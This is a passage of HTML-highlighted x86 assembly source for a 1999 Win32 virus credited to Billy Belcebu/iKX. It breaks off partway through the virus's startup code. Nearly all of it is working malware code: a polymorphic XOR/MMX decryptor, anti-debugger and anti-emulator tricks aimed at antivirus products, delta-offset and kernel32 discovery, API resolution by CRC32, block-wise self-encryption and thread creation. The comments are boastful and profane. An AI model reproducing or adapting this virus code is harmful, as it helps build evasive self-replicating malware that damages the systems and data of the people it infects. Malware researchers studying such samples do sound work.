</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THREAD_ACTIVE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">

</span><span class="sc1">; Interesting macros for my code</span><span class="sc0">

</span><span class="sc5">cmp_</span><span class="sc0">            </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc5">joff1</span><span class="sc0">               </span><span class="sc1">; Optimized version of</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">reg</span><span class="sc0">                     </span><span class="sc1">; CMP reg,0FFFFFFFFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">joff1</span><span class="sc0">                   </span><span class="sc1">; JZ  joff1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">reg</span><span class="sc0">                     </span><span class="sc1">; The code is reduced in 3 </span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">                            </span><span class="sc1">; bytes (7-4)</span><span class="sc0">

</span><span class="sc5">pushs</span><span class="sc0">           </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string2push</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">__@@__</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__@@__</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">string2push</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">__@@__</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">


</span><span class="sc5">eosz_edi</span><span class="sc0">        </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">apicall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">apioff</span><span class="sc0">                  </span><span class="sc1">; Optimize muthafucka!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apioff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">vsize</span><span class="sc0">           </span><span class="sc9">macro</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">10000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">01000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">00001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szMessage</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"First generation sample"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(C) 1999 Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Don't care about what the people thinks about you; they are too busy </span><span class="sc0">
</span><span class="sc1">; thinking how to know what do you think of them. (Murphy's law)</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; &lt;---</span><span class="sc0">
</span><span class="sc1">; Below code (until the loop) don't travel with the virus. It putz da correct</span><span class="sc0">
</span><span class="sc1">; CRC32 of all the  code blocks that are  going to be encrypted independently</span><span class="sc0">
</span><span class="sc1">; with iENC...</span><span class="sc0">
</span><span class="sc1">; ---&gt;</span><span class="sc0">

</span><span class="sc5">legacy1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">iENC_struc</span><span class="sc0">                  </span><span class="sc1">; Pointer to iENC structure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_iENC_blocks</span><span class="sc0">               </span><span class="sc1">; Number of code blocks</span><span class="sc0">
</span><span class="sc5">lgcyl00p</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; Get size of block</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; EAX = Size</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; Get relative ptr to block</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">          </span><span class="sc1">; RVA &gt;&gt; VA</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Preserve all registers</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr to block</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Get its CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EBX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Preserve after POPAD =)</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; Restore all regs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; Fix pointer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">                       </span><span class="sc1">; Store block's CRC32</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">lgcyl00p</span><span class="sc0">                        </span><span class="sc1">; Repeat the same with all</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Virus start                                                            ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ùùùùùùùùùùùùùùùùùùùùùùùù;</span><span class="sc0">
</span><span class="sc1">;                        ;</span><span class="sc0">
</span><span class="sc1">; I wanna die young      ;  ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   ÛÛÛ   ÛÛÛ  ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">; and sell my soul       ;  ÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛ   </span><span class="sc0">
</span><span class="sc1">; use up all your drugs  ;  ÛÛÛ   ÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛ       ÛÛÛ</span><span class="sc0">
</span><span class="sc1">; and make me come       ;  ÛÛÛ   ÛÛÛ ÛÛÛ ÛÛÛ   ÛÛÛ   ÛÛÛ ÛÛÛ  ÛÛÛÛ ÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">; Yesterday man,         ;  ÛÛÛ   ÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛ   ÛÛÛ       ÛÛÛ</span><span class="sc0">
</span><span class="sc1">; i was a nihilist and   ;  ÛÛÛÛÛÛÛÛÛ ÛÛÛ   ÛÛÛ ÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛ ÛÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">; now today i'm          ;  ÛÛÛÛÛÛÛÛ  ÛÛÛ   ÛÛÛ  ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">; just too fucking bored ;</span><span class="sc0">
</span><span class="sc1">;                        ;   -I don't like the drugs but the drugs like me-</span><span class="sc0">
</span><span class="sc1">;   -Marilyn Manson-     ;  </span><span class="sc0">
</span><span class="sc1">;ùùùùùùùùùùùùùùùùùùùùùùùù;</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">legacy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">LIMIT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">; Space for the poly decryptor</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Push all da shit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">; Anti NOD-iCE trick</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">realep</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seh_trick</span><span class="sc0">                       </span><span class="sc1">; Kill emulators</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">improvised_delta</span><span class="sc0">

</span><span class="sc5">decryptor</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Ptr to code to decrypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cpuid</span><span class="sc0">                                   </span><span class="sc1">; Check for MMX presence...</span><span class="sc0">
    </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">                         </span><span class="sc1">; bit 17h, please!</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0"> 

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">not_mmx</span><span class="sc0">                         </span><span class="sc1">; Damn!</span><span class="sc0">

</span><span class="sc5">@@__??</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc0">                  </span><span class="sc1">; movd  mm1,[esi]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">                  </span><span class="sc1">; movd  mm2,ebx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">0CAh</span><span class="sc0">                  </span><span class="sc1">; pxor  mm1,mm2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">07Eh</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc0">                  </span><span class="sc1">; movd  [esi],mm1</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Get next dword</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@__??</span><span class="sc0">                          </span><span class="sc1">; And decrypt it</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realep</span><span class="sc0">                          </span><span class="sc1">; Jump to unencrypted code</span><span class="sc0">

</span><span class="sc5">not_mmx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Load dword to decrypt</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Decrypt it</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store the decrypted dword</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">not_mmx</span><span class="sc0">                         </span><span class="sc1">; And loop until all decrypted</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realep</span><span class="sc0">                          </span><span class="sc1">; Jump to unencrypted code</span><span class="sc0">

</span><span class="sc5">seh_trick</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Bye bye emulators</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">realep</span><span class="sc0">                          </span><span class="sc1">; DiE NOD!!! Muahahahah!</span><span class="sc0">

</span><span class="sc5">improvised_delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decryptor</span><span class="sc0">

</span><span class="sc1">; Let me see you stripped...</span><span class="sc0">

</span><span class="sc5">crypt</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"Welcome to the realm of the legacy of kings..."</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">realep</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                           </span><span class="sc1">; Hardest code to undestand ;)</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                </span><span class="sc1">; EBP = Delta offset</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">shit_size</span><span class="sc0">                   </span><span class="sc1">; Obtain at runtime the </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">                   </span><span class="sc1">; imagebase of the process</span><span class="sc0">
</span><span class="sc5">NewEIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; EAX = Process' imagebase</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ChangeSEH</span><span class="sc0">                       </span><span class="sc1">; SEH rlz :)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Fix stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreSEH</span><span class="sc0">                      </span><span class="sc1">; And restore old SEH handler</span><span class="sc0">
</span><span class="sc5">ChangeSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Save old SEH handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">; Set new SEH handler</span><span class="sc0">
       
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlock1</span><span class="sc4">-</span><span class="sc5">Block1</span><span class="sc0">

</span><span class="sc5">Block1</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">48h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get program return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                         </span><span class="sc1">; Limit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetK32</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; EAX = 0? If so, error...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RestoreSEH</span><span class="sc0">                      </span><span class="sc1">; Then we go away...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; EAX must be K32 base address</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@NamezCRC32</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ESI = Pointer to CRC32 array</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Offsetz</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; EDI = Where put addresses</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">                         </span><span class="sc1">; Retrieve all APIs</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">random_seed</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Initialize slow random seed</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemTime</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetCurrentProcess</span><span class="sc0">              </span><span class="sc1">; This virus is slow, so i'm</span><span class="sc0">
                        </span><span class="sc1">; looking in this routines</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; for the wanted speed</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CurrentProcessHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Get the original priority</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetPriorityClass</span><span class="sc0">               </span><span class="sc1">; class</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalPriorityClass</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Fail? Duh!</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ErrorCreatingMainThread</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; Set the priority needed for</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; a faster execution</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetPriorityClass</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpThreadId</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpThreadId</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwCreationFlags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; lpParameter</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainThread</span><span class="sc4">]</span><span class="sc0">            
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; lpStartAddress</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; dwStackSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CreateThread</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">; Error?</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ErrorCreatingMainThread</span><span class="sc0">         </span><span class="sc1">; Damn...</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Wait infinite seconds until</span><span class="sc0">
